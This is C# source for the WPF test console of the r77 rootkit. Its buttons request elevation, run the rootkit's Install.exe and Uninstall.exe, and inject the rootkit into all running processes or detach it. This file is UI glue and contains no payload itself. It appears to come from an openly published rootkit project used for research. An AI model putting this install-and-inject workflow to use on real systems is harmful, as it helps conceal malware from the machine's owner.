using BytecodeApi;
using BytecodeApi.Extensions;
using BytecodeApi.IO.FileSystem;
using BytecodeApi.IO.Http;
using BytecodeApi.UI;
using BytecodeApi.UI.Data;
using Global;
using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Windows;

namespace TestConsole
{
	public sealed class MainWindowViewModel : ObservableObject
	{
		public static MainWindowViewModel Singleton { get; private set; }
		public MainWindow View { get; set; }

		private DelegateCommand _ElevateCommand;
		private DelegateCommand<string> _RunCommand;
		private DelegateCommand _InjectAllCommand;
		private DelegateCommand _DetachAllCommand;
		private DelegateCommand<string> _HelpCommand;
		public DelegateCommand ElevateCommand => _ElevateCommand ?? (_ElevateCommand = new DelegateCommand(ElevateCommand_Execute, ElevateCommand_CanExecute));
		public DelegateCommand<string> RunCommand => _RunCommand ?? (_RunCommand = new DelegateCommand<string>(RunCommand_Execute));
		public DelegateCommand InjectAllCommand => _InjectAllCommand ?? (_InjectAllCommand = new DelegateCommand(InjectAllCommand_Execute));
		public DelegateCommand DetachAllCommand => _DetachAllCommand ?? (_DetachAllCommand = new DelegateCommand(DetachAllCommand_Execute));
		public DelegateCommand<string> HelpCommand => _HelpCommand ?? (_HelpCommand = new DelegateCommand<string>(HelpCommand_Execute));

		private bool _IsInitialized;
		private bool _IsAboutVisible;
		public bool IsInitialized
		{
			get => _IsInitialized;
			set => Set(ref _IsInitialized, value);
		}
		public bool IsAboutVisible
		{
			get => _IsAboutVisible;
			set => Set(ref _IsAboutVisible, value);
		}

		public MainWindowViewModel(MainWindow view)
		{
			Singleton = this;
			View = view;

			Log.LogWritten += Log_LogWritten;
		}

		private void Log_LogWritten(object sender, LogMessage e)
		{
			View.WriteLog(e);
		}

		private bool ElevateCommand_CanExecute()
		{
			return !ApplicationBase.Process.IsElevated;
		}
		private void ElevateCommand_Execute()
		{
			ApplicationBase.RestartElevated(null, () => Application.Current.Shutdown());
		}
		private void RunCommand_Execute(string parameter)
		{
			string fileName;

			switch (parameter)
			{
				case "Example":
					fileName = $"{R77Const.HidePrefix}-Example.exe";
					break;
				case "Install":
					fileName = "Install.exe";
					break;
				case "Uninstall":
					fileName = "Uninstall.exe";
					break;
				default:
					throw new ArgumentException();
			}

			string path = Path.Combine(ApplicationBase.Path, fileName);
			if (File.Exists(path))
			{
				try
				{
					Process.Start(fileName);

					Log.Write(new LogMessage
					(
						LogMessageType.Information,
						new LogTextItem("File"),
						new LogFileItem(fileName),
						new LogTextItem("was executed.")
					));
				}
				catch (Exception ex)
				{
					Log.Write(new LogMessage
					(
						LogMessageType.Error,
						new LogTextItem("Executing"),
						new LogFileItem(fileName),
						new LogTextItem("failed."),
						new LogDetailsItem($"Error Details: {ex.Message}")
					));
				}
			}
			else
			{
				Log.Write(new LogMessage
				(
					LogMessageType.Error,
					new LogTextItem("File"),
					new LogFileItem(fileName),
					new LogTextItem("not found.")
				));
			}
		}
		private void InjectAllCommand_Execute()
		{
			Log.Write(ProcessList.InjectAll().ToArray());
			ProcessesUserControlViewModel.Singleton.UpdateProcesses();
		}
		private void DetachAllCommand_Execute()
		{
			Log.Write(ProcessList.DetachAll().ToArray());
			ProcessesUserControlViewModel.Singleton.UpdateProcesses();
		}
		private void HelpCommand_Execute(string parameter)
		{
			switch (parameter)
			{
				case "Documentation":
					try
					{
						byte[] pdf = HttpClient.Default.Get("https://docs.bytecode77.com/r77-rootkit/Technical%20Documentation.pdf").ReadBytes();
						TempDirectory.ExecuteFile("Technical Documentation.pdf", pdf);
					}
					catch (Exception ex)
					{
						Log.Write(new LogMessage
						(
							LogMessageType.Error,
							new LogTextItem("Error downloading"),
							new LogFileItem("Technical Documentation.pdf"),
							new LogTextItem("Please visit"),
							new LogLinkItem("https://bytecode77.com/r77-rootkit", () => Process.Start("https://bytecode77.com/r77-rootkit")),
							new LogDetailsItem($"Error Details: {ex.Message}")
						));
					}
					break;
				case "About":
					IsAboutVisible = true;
					break;
				default:
					throw new ArgumentException();
			}
		}

		public void WriteInitialLogEntries()
		{
			if (!ApplicationBase.Process.IsElevated)
			{
				Log.Write(new LogMessage
				(
					LogMessageType.Warning,
					new LogItem[]
					{
						new LogTextItem("To inject or detach elevated processes,"),
						new LogLinkItem("run as administrator", () => ElevateCommand.Execute())
					},
					true
				));
			}

			if (new[] { "Helper32.dll", "Helper64.dll" }.Any(file => !File.Exists(Path.Combine(ApplicationBase.Path, file))))
			{
				Log.Write(new LogMessage
				(
					LogMessageType.Error,
					new LogItem[]
					{
						new LogTextItem("Files"),
						new LogFileItem("Helper32.dll"),
						new LogTextItem("and"),
						new LogFileItem("Helper64.dll"),
						new LogTextItem("not found.")
					},
					true
				));
			}
		}
	}
}